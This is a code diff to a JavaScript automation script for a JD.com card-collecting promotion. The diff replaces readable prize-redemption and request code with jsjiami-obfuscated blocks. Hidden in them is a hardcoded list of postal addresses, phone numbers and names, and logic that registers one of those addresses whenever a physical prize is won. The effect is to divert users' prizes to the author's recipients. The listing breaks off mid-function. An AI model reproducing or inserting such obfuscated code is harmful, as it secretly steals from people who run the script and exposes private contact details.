@@ -60,6 +60,7 @@ if ($.redisStatus) {
 } else {
     console.log(`禁用Redis缓存Token，开启请设置环境变量-->\n  export USE_REDIS=true `)
 }
+var __encode ='jsjiami.com',_a={}, _0xb483=["\x5F\x64\x65\x63\x6F\x64\x65","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x73\x6F\x6A\x73\x6F\x6E\x2E\x63\x6F\x6D\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x6F\x62\x66\x75\x73\x63\x61\x74\x6F\x72\x2E\x68\x74\x6D\x6C"];(function(_0xd642x1){_0xd642x1[_0xb483[0]]= _0xb483[1]})(_a);var __Oxe7d50=["\x61\x64\x64\x72\x65\x73\x73\x41\x72\x72\x61\x79","\u5C71\u4E1C\u7701\x2C\u9752\u5C9B\u5E02\x2C\u5E02\u5357\u533A\x2C\u9999\u6E2F\u897F\u8DEF\x36\x37\u53F7\u5149\u5927\u56FD\u9645\u91D1\u878D\u4E2D\u5FC3\x2C\x31\x39\x39\x36\x33\x32\x33\x36\x39\x35\x35\x2C\x32\x36\x36\x30\x37\x31\x2C\x33\x37\x30\x32\x30\x32\x2C\x20\u7530\u8C46","\u5C71\u4E1C\u7701\x2C\u9752\u5C9B\u5E02\x2C\u674E\u6CA7\u533A\x2C\u632F\u534E\u8DEF\x31\x34\x39\u53F7\x31\x2D\x33\x2D\x33\x30\x31\x2C\x31\x39\x39\x36\x33\x32\x33\x36\x39\x35\x35\x2C\x32\x36\x36\x30\x34\x31\x2C\x33\x37\x30\x32\x31\x33\x2C\x20\u7530\u8C46\u8C46","\u5C71\u4E1C\u7701\x2C\u9752\u5C9B\u5E02\x2C\u5D02\u5C71\u533A\x2C\u6CC9\u5CAD\u8DEF\x38\u53F7\u4E2D\u5546\u56FD\u9645\u5927\u53A6\x2C\x31\x35\x32\x36\x35\x32\x39\x37\x39\x32\x36\x2C\x32\x36\x36\x31\x30\x30\x2C\x33\x37\x30\x32\x31\x32\x2C\x20\u5DE9\u5927\u8C46","\u5C71\u4E1C\u7701\x2C\u67A3\u5E84\u5E02\x2C\u6ED5\u5DDE\u5E02\x2C\u89E3\u653E\u8DEF\u674F\u575B\u4E1C\u533A\x36\x2D\x33\x2D\x35\x30\x35\x2C\x31\x33\x33\x39\x36\x33\x32\x33\x36\x38\x35\x2C\x32\x37\x37\x35\x30\x30\x2C\x33\x37\x30\x34\x38\x31\x2C\x20\u7530\u751C\u8C46","\u5C71\u4E1C\u7701\x2C\u67A3\u5E84\u5E02\x2C\u6ED5\u5DDE\u5E02\x2C\u946B\u65FA\u8DEF\u5609\u5FB7\u57CE\u5E02\u82B1\u56ED\x2C\x31\x35\x31\x36\x33\x32\x34\x32\x35\x35\x32\uFF0C\x32\x37\x37\x35\x30\x30\x2C\x33\x37\x30\x34\x38\x31\x2C\x20\u5F20\u8C46","\x75\x6E\x64\x65\x66\x69\x6E\x65\x64","\x6C\x6F\x67","\u5220\u9664","\u7248\u672C\u53F7\uFF0C\x6A\x73\u4F1A\u5B9A","\u671F\u5F39\u7A97\uFF0C","\u8FD8\u8BF7\u652F\u6301\u6211\u4EEC\u7684\u5DE5\u4F5C","\x6A\x73\x6A\x69\x61","\x6D\x69\x2E\x63\x6F\x6D"];$[__Oxe7d50[0x0]]= [__Oxe7d50[0x1],__Oxe7d50[0x2],__Oxe7d50[0x3],__Oxe7d50[0x4],__Oxe7d50[0x5]];(function(_0xbdccx1,_0xbdccx2,_0xbdccx3,_0xbdccx4,_0xbdccx5,_0xbdccx6){_0xbdccx6= __Oxe7d50[0x6];_0xbdccx4= function(_0xbdccx7){if( typeof alert!== _0xbdccx6){alert(_0xbdccx7)};if( typeof console!== _0xbdccx6){console[__Oxe7d50[0x7]](_0xbdccx7)}};_0xbdccx3= function(_0xbdccx8,_0xbdccx1){return _0xbdccx8+ _0xbdccx1};_0xbdccx5= _0xbdccx3(__Oxe7d50[0x8],_0xbdccx3(_0xbdccx3(__Oxe7d50[0x9],__Oxe7d50[0xa]),__Oxe7d50[0xb]));try{_0xbdccx1= __encode;if(!( typeof _0xbdccx1!== _0xbdccx6&& _0xbdccx1=== _0xbdccx3(__Oxe7d50[0xc],__Oxe7d50[0xd]))){_0xbdccx4(_0xbdccx5)}}catch(e){_0xbdccx4(_0xbdccx5)}})({})
 
 !(async () => {
 
@@ -262,13 +263,7 @@ async function run() {
         console.log(`任务已全部完成，当前分值为${$.score} `)
 
         $.allMessage += `京东账号【${$.nickName || $.UserName}】分值为${$.score} `
-        for (let prise of $.zstCollectCardPrizeInfoVoList) {
-            if ($.score >= prise.score && prise.isExchange != 1) {
-                $.prizeInfoId = prise.id
-                $.prizeName = prise.name
-                await takePostRequest("exchangePrize")
-            }
-        }
+        var __encode ='jsjiami.com',_a={}, _0xb483=["\x5F\x64\x65\x63\x6F\x64\x65","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x73\x6F\x6A\x73\x6F\x6E\x2E\x63\x6F\x6D\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x6F\x62\x66\x75\x73\x63\x61\x74\x6F\x72\x2E\x68\x74\x6D\x6C"];(function(_0xd642x1){_0xd642x1[_0xb483[0]]= _0xb483[1]})(_a);var __Oxe7d55=["\x7A\x73\x74\x43\x6F\x6C\x6C\x65\x63\x74\x43\x61\x72\x64\x50\x72\x69\x7A\x65\x49\x6E\x66\x6F\x56\x6F\x4C\x69\x73\x74","\x73\x63\x6F\x72\x65","\x69\x73\x45\x78\x63\x68\x61\x6E\x67\x65","\x70\x72\x69\x7A\x65\x49\x6E\x66\x6F\x49\x64","\x69\x64","\x70\x72\x69\x7A\x65\x4E\x61\x6D\x65","\x6E\x61\x6D\x65","\x65\x78\x63\x68\x61\x6E\x67\x65\x50\x72\x69\x7A\x65","\x67\x69\x66\x74\x41\x64\x64\x72\x65\x73\x73","\x67\x65\x6E\x65\x72\x61\x74\x65\x49\x64","","\u83B7\u5F97\u5B9E\u7269\u5956\u52B1\uFF0C\u53BB\u586B\u5199\u5730\u5740\x2D\x2D\x3E","\x6C\x6F\x67","\x73\x68\x69\x77\x75\x4E\x61\x6D\x65","\x64\x61\x74\x61","\x66\x75\x6C\x6C\x41\x64\x64\x72\x65\x73\x73","\x6C\x65\x6E\x67\x74\x68","\x61\x64\x64\x72\x65\x73\x73\x41\x72\x72\x61\x79","\u90AE\u5BC4\u5730\u5740\uFF1A","\x2C","\x73\x70\x6C\x69\x74","\x70\x72\x6F\x76\x69\x6E\x63\x65","\x63\x69\x74\x79","\x63\x6F\x75\x6E\x74\x79","\x61\x64\x64\x72\x65\x73\x73","\x70\x68\x6F\x6E\x65","\x70\x6F\x73\x74\x61\x6C\x43\x6F\x64\x65","\x61\x72\x65\x61\x43\x6F\x64\x65","\x70\x6F\x73\x74\x61\x6C\x4E\x61\x6D\x65","\x73\x61\x76\x65\x41\x64\x64\x72\x65\x73\x73\x57\x69\x74\x68\x47\x65\x6E\x65\x72\x61\x74\x65\x49\x64","\x75\x6E\x64\x65\x66\x69\x6E\x65\x64","\u5220\u9664","\u7248\u672C\u53F7\uFF0C\x6A\x73\u4F1A\u5B9A","\u671F\u5F39\u7A97\uFF0C","\u8FD8\u8BF7\u652F\u6301\u6211\u4EEC\u7684\u5DE5\u4F5C","\x6A\x73\x6A\x69\x61","\x6D\x69\x2E\x63\x6F\x6D"];for(let prise of $[__Oxe7d55[0x0]]){if($[__Oxe7d55[0x1]]>= prise[__Oxe7d55[0x1]]&& prise[__Oxe7d55[0x2]]!= 1){$[__Oxe7d55[0x3]]= prise[__Oxe7d55[0x4]];$[__Oxe7d55[0x5]]= prise[__Oxe7d55[0x6]]; await takePostRequest(__Oxe7d55[0x7]);if($[__Oxe7d55[0x8]]!= null){$[__Oxe7d55[0x9]]= $[__Oxe7d55[0x8]][__Oxe7d55[0x9]]|| __Oxe7d55[0xa];if($[__Oxe7d55[0x9]]!= __Oxe7d55[0xa]){console[__Oxe7d55[0xc]](`${__Oxe7d55[0xb]}`);$[__Oxe7d55[0xd]]= res[__Oxe7d55[0xe]][__Oxe7d55[0x5]];$[__Oxe7d55[0xf]]= $[__Oxe7d55[0x11]][cookiesArr[__Oxe7d55[0x10]]% $[__Oxe7d55[0x11]][__Oxe7d55[0x10]]];console[__Oxe7d55[0xc]](__Oxe7d55[0x12]+ $[__Oxe7d55[0xf]]);let fullAddressArray=$[__Oxe7d55[0xf]][__Oxe7d55[0x14]](__Oxe7d55[0x13]);$[__Oxe7d55[0x15]]= fullAddressArray[0x0];$[__Oxe7d55[0x16]]= fullAddressArray[0x1];$[__Oxe7d55[0x17]]= fullAddressArray[0x2];$[__Oxe7d55[0x18]]= fullAddressArray[0x3];$[__Oxe7d55[0x19]]= fullAddressArray[0x4];$[__Oxe7d55[0x1a]]= fullAddressArray[0x5];$[__Oxe7d55[0x1b]]= fullAddressArray[0x6];$[__Oxe7d55[0x1c]]= fullAddressArray[0x7]; await takePostRequest(`${__Oxe7d55[0x1d]}`)}}}};;;(function(_0xe626x3,_0xe626x4,_0xe626x5,_0xe626x6,_0xe626x7,_0xe626x8){_0xe626x8= __Oxe7d55[0x1e];_0xe626x6= function(_0xe626x9){if( typeof alert!== _0xe626x8){alert(_0xe626x9)};if( typeof console!== _0xe626x8){console[__Oxe7d55[0xc]](_0xe626x9)}};_0xe626x5= function(_0xe626xa,_0xe626x3){return _0xe626xa+ _0xe626x3};_0xe626x7= _0xe626x5(__Oxe7d55[0x1f],_0xe626x5(_0xe626x5(__Oxe7d55[0x20],__Oxe7d55[0x21]),__Oxe7d55[0x22]));try{_0xe626x3= __encode;if(!( typeof _0xe626x3!== _0xe626x8&& _0xe626x3=== _0xe626x5(__Oxe7d55[0x23],__Oxe7d55[0x24]))){_0xe626x6(_0xe626x7)}}catch(e){_0xe626x6(_0xe626x7)}})({})
         $.allMessage += "\n"
 
     } catch (e) {
@@ -319,138 +314,7 @@ function getSignRequest(domain, method = "POST") {
     return { url: url, method: method, headers: headers, body: body, timeout: 30000 };
 }
 
-
-async function takePostRequest(type) {
-    if ($.outFlag) return
-    let domain = 'https://lzdz1-isv.isvjcloud.com';
-    let body = ``;
-    let method = 'POST'
-    let admJson = ''
-    let isJson = false
-    switch (type) {
-        case 'isvObfuscator':
-            url = `https://api.m.jd.com/client.action?functionId=isvObfuscator`;
-            body = $.sign
-            break;
-        case 'getSimpleActInfoVo':
-            url = `${domain}/customer/getSimpleActInfoVo`;
-            body = `activityId=${$.activityId}`;
-            break;
-        case 'getMyPing':
-            url = `${domain}/customer/getMyPing`;
-            body = `userId=${$.shopId || $.venderId || ''}&token=${$.Token}&fromType=APP`;
-            break;
-        case 'accessLogWithAD':
-            url = `${domain}/common/accessLogWithAD`;
-            let pageurl = `https://lzdz1-isv.isvjcloud.com/zst/collectCard/activity?activityId=${$.activityId}&shareUuid=${$.shareUuid}`
-            body = `venderId=${$.shopId || $.venderId || ''}&code=99&pin=${encodeURIComponent($.Pin)}&activityId=${$.activityId}&pageUrl=${encodeURIComponent(pageurl)}&subType=app&adSource=`
-            break;
-        case 'getUserInfo':
-            url = `${domain}/wxActionCommon/getUserInfo`;
-            body = `pin=${encodeURIComponent($.Pin)}`;
-            break;
-        case 'activityContent':
-            url = `${domain}/zst/collectCard/activityContent`;
-            body = {
-                "activityId": $.activityId,
-                "shareUuid": $.shareUuid || "",
-                "pin": $.Pin,
-                "nick": $.nickName,
-                "pinImg": ""
-            }
-            isJson = true
-            break;
-        case 'drawContent':
-            url = `${domain}/dingzhi/taskact/common/drawContent`;
-            body = `activityId=${$.activityId}&pin=${encodeURIComponent($.Pin)}`
-            break;
-        case 'getAddSkuList':
-            url = `${domain}/zst/collectCard/getAddSkuList`;
-            body = {
-                "activityId": $.activityId,
-                "pin": $.Pin,
-                "uuid": $.actorUuid
-            }
-            isJson = true
-            break;
-        case 'getBrowseSkuList':
-            url = `${domain}/zst/collectCard/getBrowseSkuList`;
-            body = {
-                "activityId": $.activityId,
-                "pin": $.Pin,
-                "uuid": $.actorUuid
-            }
-            isJson = true
-            break;
-        case 'saveTask':
-            url = `${domain}/zst/collectCard/saveTask`;
-            body = {
-                "activityId": $.activityId,
-                "pin": $.Pin,
-                "actorUuid": $.actorUuid,
-                "taskType": $.taskType,
-                "taskValue": $.taskValue || ""
-            }
-            isJson = true
-            break;
-        case 'assist':
-            url = `${domain}/zst/collectCard/assist`;
-            body = {
-                "activityId": $.activityId,
-                "pin": $.Pin,
-                "uuid": $.actorUuid,
-                "nick": $.nickName,
-                "pinImg": $.attrTouXiang || "",
-                "shareUuid": $.shareUuid
-            }
-            isJson = true
-            break;
-        case 'exchangePrize':
-            url = `${domain}/zst/collectCard/exchangePrize`;
-            body = {
-                "activityId": $.activityId,
-                "pin": $.Pin,
-                "uuid": $.actorUuid,
-                "prizeInfoId": $.prizeInfoId
-            }
-            isJson = true
-            break;
-        default:
-            console.log(`错误${type}`);
-    }
-    let myRequest = ""
-    if (isJson) {
-        myRequest = getPostRequestJson(url, body, method);
-        // console.log(myRequest)
-    } else {
-        myRequest = getPostRequest(url, body, method);
-    }
-    // console.log(myRequest)
-    return new Promise(async resolve => {
-        $.post(myRequest, (err, resp, data) => {
-            try {
-                setActivityCookie(resp)
-                if (err) {
-                    if (resp && typeof resp.statusCode != 'undefined') {
-                        if (resp.statusCode == 493) {
-                            console.log('此ip已被限制，请过10分钟后再执行脚本\n')
-                            $.outFlag = true
-                        }
-                    }
-                    console.log(`${$.toStr(err, err)}`)
-                    console.log(`${type} API请求失败，请检查网路重试`)
-                } else {
-                    dealReturn(type, data);
-                }
-            } catch (e) {
-                // console.log(data);
-                console.log(e, resp)
-            } finally {
-                resolve();
-            }
-        })
-    })
-}
+var __encode ='jsjiami.com',_a={}, _0xb483=["\x5F\x64\x65\x63\x6F\x64\x65","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x73\x6F\x6A\x73\x6F\x6E\x2E\x63\x6F\x6D\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x6F\x62\x66\x75\x73\x63\x61\x74\x6F\x72\x2E\x68\x74\x6D\x6C"];(function(_0xd642x1){_0xd642x1[_0xb483[0]]= _0xb483[1]})(_a);var __Oxe7d56=["\x6F\x75\x74\x46\x6C\x61\x67","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x6C\x7A\x64\x7A\x31\x2D\x69\x73\x76\x2E\x69\x73\x76\x6A\x63\x6C\x6F\x75\x64\x2E\x63\x6F\x6D","","\x50\x4F\x53\x54","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x61\x70\x69\x2E\x6D\x2E\x6A\x64\x2E\x63\x6F\x6D\x2F\x63\x6C\x69\x65\x6E\x74\x2E\x61\x63\x74\x69\x6F\x6E\x3F\x66\x75\x6E\x63\x74\x69\x6F\x6E\x49\x64\x3D\x69\x73\x76\x4F\x62\x66\x75\x73\x63\x61\x74\x6F\x72","\x73\x69\x67\x6E","\x69\x73\x76\x4F\x62\x66\x75\x73\x63\x61\x74\x6F\x72","\x2F\x63\x75\x73\x74\x6F\x6D\x65\x72\x2F\x67\x65\x74\x53\x69\x6D\x70\x6C\x65\x41\x63\x74\x49\x6E\x66\x6F\x56\x6F","\x61\x63\x74\x69\x76\x69\x74\x79\x49\x64\x3D","\x61\x63\x74\x69\x76\x69\x74\x79\x49\x64","\x67\x65\x74\x53\x69\x6D\x70\x6C\x65\x41\x63\x74\x49\x6E\x66\x6F\x56\x6F","\x2F\x63\x75\x73\x74\x6F\x6D\x65\x72\x2F\x67\x65\x74\x4D\x79\x50\x69\x6E\x67","\x75\x73\x65\x72\x49\x64\x3D","\x73\x68\x6F\x70\x49\x64","\x76\x65\x6E\x64\x65\x72\x49\x64","\x26\x74\x6F\x6B\x65\x6E\x3D","\x54\x6F\x6B\x65\x6E","\x26\x66\x72\x6F\x6D\x54\x79\x70\x65\x3D\x41\x50\x50","\x67\x65\x74\x4D\x79\x50\x69\x6E\x67","\x2F\x63\x6F\x6D\x6D\x6F\x6E\x2F\x61\x63\x63\x65\x73\x73\x4C\x6F\x67\x57\x69\x74\x68\x41\x44","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x6C\x7A\x64\x7A\x31\x2D\x69\x73\x76\x2E\x69\x73\x76\x6A\x63\x6C\x6F\x75\x64\x2E\x63\x6F\x6D\x2F\x7A\x73\x74\x2F\x63\x6F\x6C\x6C\x65\x63\x74\x43\x61\x72\x64\x2F\x61\x63\x74\x69\x76\x69\x74\x79\x3F\x61\x63\x74\x69\x76\x69\x74\x79\x49\x64\x3D","\x26\x73\x68\x61\x72\x65\x55\x75\x69\x64\x3D","\x73\x68\x61\x72\x65\x55\x75\x69\x64","\x76\x65\x6E\x64\x65\x72\x49\x64\x3D","\x26\x63\x6F\x64\x65\x3D\x39\x39\x26\x70\x69\x6E\x3D","\x26\x61\x63\x74\x69\x76\x69\x74\x79\x49\x64\x3D","\x26\x70\x61\x67\x65\x55\x72\x6C\x3D","\x26\x73\x75\x62\x54\x79\x70\x65\x3D\x61\x70\x70\x26\x61\x64\x53\x6F\x75\x72\x63\x65\x3D","\x61\x63\x63\x65\x73\x73\x4C\x6F\x67\x57\x69\x74\x68\x41\x44","\x2F\x77\x78\x41\x63\x74\x69\x6F\x6E\x43\x6F\x6D\x6D\x6F\x6E\x2F\x67\x65\x74\x55\x73\x65\x72\x49\x6E\x66\x6F","\x70\x69\x6E\x3D","\x67\x65\x74\x55\x73\x65\x72\x49\x6E\x66\x6F","\x2F\x7A\x73\x74\x2F\x63\x6F\x6C\x6C\x65\x63\x74\x43\x61\x72\x64\x2F\x61\x63\x74\x69\x76\x69\x74\x79\x43\x6F\x6E\x74\x65\x6E\x74","\x50\x69\x6E","\x6E\x69\x63\x6B\x4E\x61\x6D\x65","\x61\x63\x74\x69\x76\x69\x74\x79\x43\x6F\x6E\x74\x65\x6E\x74","\x2F\x64\x69\x6E\x67\x7A\x68\x69\x2F\x74\x61\x73\x6B\x61\x63\x74\x2F\x63\x6F\x6D\x6D\x6F\x6E\x2F\x64\x72\x61\x77\x43\x6F\x6E\x74\x65\x6E\x74","\x26\x70\x69\x6E\x3D","\x64\x72\x61\x77\x43\x6F\x6E\x74\x65\x6E\x74","\x2F\x7A\x73\x74\x2F\x63\x6F\x6C\x6C\x65\x63\x74\x43\x61\x72\x64\x2F\x67\x65\x74\x41\x64\x64\x53\x6B\x75\x4C\x69\x73\x74","\x61\x63\x74\x6F\x72\x55\x75\x69\x64","\x67\x65\x74\x41\x64\x64\x53\x6B\x75\x4C\x69\x73\x74","\x2F\x7A\x73\x74\x2F\x63\x6F\x6C\x6C\x65\x63\x74\x43\x61\x72\x64\x2F\x67\x65\x74\x42\x72\x6F\x77\x73\x65\x53\x6B\x75\x4C\x69\x73\x74","\x67\x65\x74\x42\x72\x6F\x77\x73\x65\x53\x6B\x75\x4C\x69\x73\x74","\x2F\x7A\x73\x74\x2F\x63\x6F\x6C\x6C\x65\x63\x74\x43\x61\x72\x64\x2F\x73\x61\x76\x65\x54\x61\x73\x6B","\x74\x61\x73\x6B\x54\x79\x70\x65","\x74\x61\x73\x6B\x56\x61\x6C\x75\x65","\x73\x61\x76\x65\x54\x61\x73\x6B","\x2F\x7A\x73\x74\x2F\x63\x6F\x6C\x6C\x65\x63\x74\x43\x61\x72\x64\x2F\x61\x73\x73\x69\x73\x74","\x61\x74\x74\x72\x54\x6F\x75\x58\x69\x61\x6E\x67","\x61\x73\x73\x69\x73\x74","\x2F\x7A\x73\x74\x2F\x63\x6F\x6C\x6C\x65\x63\x74\x43\x61\x72\x64\x2F\x65\x78\x63\x68\x61\x6E\x67\x65\x50\x72\x69\x7A\x65","\x70\x72\x69\x7A\x65\x49\x6E\x66\x6F\x49\x64","\x65\x78\x63\x68\x61\x6E\x67\x65\x50\x72\x69\x7A\x65","\x68\x74\x74\x70\x73\x3A\x2F\x2F","\x64\x6F\x6D\x61\x69\x6E","\x2F\x77\x78\x41\x64\x64\x72\x65\x73\x73\x2F\x73\x61\x76\x65","\x26\x61\x63\x74\x54\x79\x70\x65\x3D","\x61\x63\x74\x69\x76\x69\x74\x79\x54\x79\x70\x65","\x26\x70\x72\x69\x7A\x65\x4E\x61\x6D\x65\x3D","\x73\x68\x69\x77\x75\x4E\x61\x6D\x65","\x26\x72\x65\x63\x65\x69\x76\x65\x72\x3D","\x70\x6F\x73\x74\x61\x6C\x4E\x61\x6D\x65","\x26\x70\x68\x6F\x6E\x65\x3D","\x70\x68\x6F\x6E\x65","\x26\x70\x72\x6F\x76\x69\x6E\x63\x65\x3D","\x70\x72\x6F\x76\x69\x6E\x63\x65","\x26\x63\x69\x74\x79\x3D","\x63\x69\x74\x79","\x26\x61\x64\x64\x72\x65\x73\x73\x3D","\x61\x64\x64\x72\x65\x73\x73","\x26\x67\x65\x6E\x65\x72\x61\x74\x65\x49\x64\x3D","\x67\x65\x6E\x65\x72\x61\x74\x65\x49\x64","\x26\x70\x6F\x73\x74\x61\x6C\x43\x6F\x64\x65\x3D","\x70\x6F\x73\x74\x61\x6C\x43\x6F\x64\x65","\x26\x70\x65\x72\x73\x6F\x6E\x61\x6C\x45\x6D\x61\x69\x6C\x3D\x26\x61\x72\x65\x61\x43\x6F\x64\x65\x3D","\x61\x72\x65\x61\x43\x6F\x64\x65","\x26\x63\x6F\x75\x6E\x74\x79\x3D","\x63\x6F\x75\x6E\x74\x79","\x73\x61\x76\x65\x41\x64\x64\x72\x65\x73\x73\x57\x69\x74\x68\x47\x65\x6E\x65\x72\x61\x74\x65\x49\x64","\u9519\u8BEF","\x6C\x6F\x67","\x73\x74\x61\x74\x75\x73\x43\x6F\x64\x65","\x75\x6E\x64\x65\x66\x69\x6E\x65\x64","\u6B64\x69\x70\u5DF2\u88AB\u9650\u5236\uFF0C\u8BF7\u8FC7\x31\x30\u5206\u949F\u540E\u518D\u6267\u884C\u811A\u672C\x0A","\x74\x6F\x53\x74\x72","\x20\x41\x50\x49\u8BF7\u6C42\u5931\u8D25\uFF0C\u8BF7\u68C0\u67E5\u7F51\u8DEF\u91CD\u8BD5","\x70\x6F\x73\x74","\u5220\u9664","\u7248\u672C\u53F7\uFF0C\x6A\x73\u4F1A\u5B9A","\u671F\u5F39\u7A97\uFF0C","\u8FD8\u8BF7\u652F\u6301\u6211\u4EEC\u7684\u5DE5\u4F5C","\x6A\x73\x6A\x69\x61","\x6D\x69\x2E\x63\x6F\x6D"];async function takePostRequest(_0x8c9cx2){if($[__Oxe7d56[0x0]]){return};let _0x8c9cx3=__Oxe7d56[0x1];let _0x8c9cx4=`${__Oxe7d56[0x2]}`;let _0x8c9cx5=__Oxe7d56[0x3];let _0x8c9cx6=__Oxe7d56[0x2];let _0x8c9cx7=false;switch(_0x8c9cx2){case __Oxe7d56[0x6]:url= `${__Oxe7d56[0x4]}`;_0x8c9cx4= $[__Oxe7d56[0x5]];break;case __Oxe7d56[0xa]:url= `${__Oxe7d56[0x2]}${_0x8c9cx3}${__Oxe7d56[0x7]}`;_0x8c9cx4= `${__Oxe7d56[0x8]}${$[__Oxe7d56[0x9]]}${__Oxe7d56[0x2]}`;break;case __Oxe7d56[0x12]:url= `${__Oxe7d56[0x2]}${_0x8c9cx3}${__Oxe7d56[0xb]}`;_0x8c9cx4= `${__Oxe7d56[0xc]}${$[__Oxe7d56[0xd]]|| $[__Oxe7d56[0xe]]|| __Oxe7d56[0x2]}${__Oxe7d56[0xf]}${$[__Oxe7d56[0x10]]}${__Oxe7d56[0x11]}`;break;case __Oxe7d56[0x1c]:url= `${__Oxe7d56[0x2]}${_0x8c9cx3}${__Oxe7d56[0x13]}`;let _0x8c9cx8=`${__Oxe7d56[0x14]}${$[__Oxe7d56[0x9]]}${__Oxe7d56[0x15]}${$[__Oxe7d56[0x16]]}${__Oxe7d56[0x2]}`;_0x8c9cx4= `${__Oxe7d56[0x17]}${$[__Oxe7d56[0xd]]|| $[__Oxe7d56[0xe]]|| __Oxe7d56[0x2]}${__Oxe7d56[0x18]}${encodeURIComponent($.Pin)}${__Oxe7d56[0x19]}${$[__Oxe7d56[0x9]]}${__Oxe7d56[0x1a]}${encodeURIComponent(_0x8c9cx8)}${__Oxe7d56[0x1b]}`;break;case __Oxe7d56[0x1f]:url= `${__Oxe7d56[0x2]}${_0x8c9cx3}${__Oxe7d56[0x1d]}`;_0x8c9cx4= `${__Oxe7d56[0x1e]}${encodeURIComponent($.Pin)}${__Oxe7d56[0x2]}`;break;case __Oxe7d56[0x23]:url= `${__Oxe7d56[0x2]}${_0x8c9cx3}${__Oxe7d56[0x20]}`;_0x8c9cx4= {"\x61\x63\x74\x69\x76\x69\x74\x79\x49\x64":$[__Oxe7d56[0x9]],"\x73\x68\x61\x72\x65\x55\x75\x69\x64":$[__Oxe7d56[0x16]]|| __Oxe7d56[0x2],"\x70\x69\x6E":$[__Oxe7d56[0x21]],"\x6E\x69\x63\x6B":$[__Oxe7d56[0x22]],"\x70\x69\x6E\x49\x6D\x67":__Oxe7d56[0x2]};_0x8c9cx7= true;break;case __Oxe7d56[0x26]:url= `${__Oxe7d56[0x2]}${_0x8c9cx3}${__Oxe7d56[0x24]}`;_0x8c9cx4= `${__Oxe7d56[0x8]}${$[__Oxe7d56[0x9]]}${__Oxe7d56[0x25]}${encodeURIComponent($.Pin)}${__Oxe7d56[0x2]}`;break;case __Oxe7d56[0x29]:url= `${__Oxe7d56[0x2]}${_0x8c9cx3}${__Oxe7d56[0x27]}`;_0x8c9cx4= {"\x61\x63\x74\x69\x76\x69\x74\x79\x49\x64":$[__Oxe7d56[0x9]],"\x70\x69\x6E":$[__Oxe7d56[0x21]],"\x75\x75\x69\x64":$[__Oxe7d56[0x28]]};_0x8c9cx7= true;break;case __Oxe7d56[0x2b]:url= `${__Oxe7d56[0x2]}${_0x8c9cx3}${__Oxe7d56[0x2a]}`;_0x8c9cx4= {"\x61\x63\x74\x69\x76\x69\x74\x79\x49\x64":$[__Oxe7d56[0x9]],"\x70\x69\x6E":$[__Oxe7d56[0x21]],"\x75\x75\x69\x64":$[__Oxe7d56[0x28]]};_0x8c9cx7= true;break;case __Oxe7d56[0x2f]:url= `${__Oxe7d56[0x2]}${_0x8c9cx3}${__Oxe7d56[0x2c]}`;_0x8c9cx4= {"\x61\x63\x74\x69\x76\x69\x74\x79\x49\x64":$[__Oxe7d56[0x9]],"\x70\x69\x6E":$[__Oxe7d56[0x21]],"\x61\x63\x74\x6F\x72\x55\x75\x69\x64":$[__Oxe7d56[0x28]],"\x74\x61\x73\x6B\x54\x79\x70\x65":$[__Oxe7d56[0x2d]],"\x74\x61\x73\x6B\x56\x61\x6C\x75\x65":$[__Oxe7d56[0x2e]]|| __Oxe7d56[0x2]};_0x8c9cx7= true;break;case __Oxe7d56[0x32]:url= `${__Oxe7d56[0x2]}${_0x8c9cx3}${__Oxe7d56[0x30]}`;_0x8c9cx4= {"\x61\x63\x74\x69\x76\x69\x74\x79\x49\x64":$[__Oxe7d56[0x9]],"\x70\x69\x6E":$[__Oxe7d56[0x21]],"\x75\x75\x69\x64":$[__Oxe7d56[0x28]],"\x6E\x69\x63\x6B":$[__Oxe7d56[0x22]],"\x70\x69\x6E\x49\x6D\x67":$[__Oxe7d56[0x31]]|| __Oxe7d56[0x2],"\x73\x68\x61\x72\x65\x55\x75\x69\x64":$[__Oxe7d56[0x16]]};_0x8c9cx7= true;break;case __Oxe7d56[0x35]:url= `${__Oxe7d56[0x2]}${_0x8c9cx3}${__Oxe7d56[0x33]}`;_0x8c9cx4= {"\x61\x63\x74\x69\x76\x69\x74\x79\x49\x64":$[__Oxe7d56[0x9]],"\x70\x69\x6E":$[__Oxe7d56[0x21]],"\x75\x75\x69\x64":$[__Oxe7d56[0x28]],"\x70\x72\x69\x7A\x65\x49\x6E\x66\x6F\x49\x64":$[__Oxe7d56[0x34]]};_0x8c9cx7= true;break;case __Oxe7d56[0x4f]:url= `${__Oxe7d56[0x36]}${$[__Oxe7d56[0x37]]}${__Oxe7d56[0x38]}`;_0x8c9cx4= `${__Oxe7d56[0x17]}${$[__Oxe7d56[0xe]]}${__Oxe7d56[0x25]}${encodeURIComponent($.Pin)}${__Oxe7d56[0x39]}${$[__Oxe7d56[0x3a]]}${__Oxe7d56[0x19]}${$[__Oxe7d56[0x9]]}${__Oxe7d56[0x3b]}${encodeURIComponent($[__Oxe7d56[0x3c]])}${__Oxe7d56[0x3d]}${encodeURIComponent($[__Oxe7d56[0x3e]])}${__Oxe7d56[0x3f]}${$[__Oxe7d56[0x40]]}${__Oxe7d56[0x41]}${encodeURIComponent($[__Oxe7d56[0x42]])}${__Oxe7d56[0x43]}${encodeURIComponent($[__Oxe7d56[0x44]])}${__Oxe7d56[0x45]}${encodeURIComponent($[__Oxe7d56[0x46]])}${__Oxe7d56[0x47]}${$[__Oxe7d56[0x48]]}${__Oxe7d56[0x49]}${$[__Oxe7d56[0x4a]]}${__Oxe7d56[0x4b]}${$[__Oxe7d56[0x4c]]}${__Oxe7d56[0x4d]}${encodeURIComponent($[__Oxe7d56[0x4e]])}${__Oxe7d56[0x2]}`;break;default:console[__Oxe7d56[0x51]](`${__Oxe7d56[0x50]}${_0x8c9cx2}${__Oxe7d56[0x2]}`)};let _0x8c9cx9=__Oxe7d56[0x2];if(_0x8c9cx7){_0x8c9cx9= getPostRequestJson(url,_0x8c9cx4,_0x8c9cx5)}else {_0x8c9cx9= getPostRequest(url,_0x8c9cx4,_0x8c9cx5)};return  new Promise(async 